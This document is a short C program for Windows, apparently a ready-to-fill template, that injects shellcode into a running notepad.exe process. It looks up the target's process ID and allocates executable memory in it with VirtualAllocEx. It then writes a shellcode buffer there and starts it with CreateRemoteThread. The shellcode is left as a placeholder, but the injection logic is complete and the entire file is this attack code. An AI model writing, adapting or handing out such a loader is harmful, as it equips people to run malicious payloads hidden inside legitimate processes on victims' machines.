#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
char shellcode[] ="your shellcode here";
unsigned int shellcodeSize = sizeof(shellcode);
// Function to get the Process ID (PID) by its name
int getPIDbyProcName(const char* procName) {
	int pid = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnap, &pe32) != FALSE) {
		while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
			if (strcmp(pe32.szExeFile, procName) == 0) {
				pid = pe32.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnap);
	return pid;
}
int main() {
	// Get the PID of the process to inject into
	int pid = getPIDbyProcName("notepad.exe");
	if (pid == 0) {
		printf("Process not found\n");
		return 1;
	}
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID hAlloc = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProc, hAlloc, shellcode, shellcodeSize, NULL);
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	return 0;
}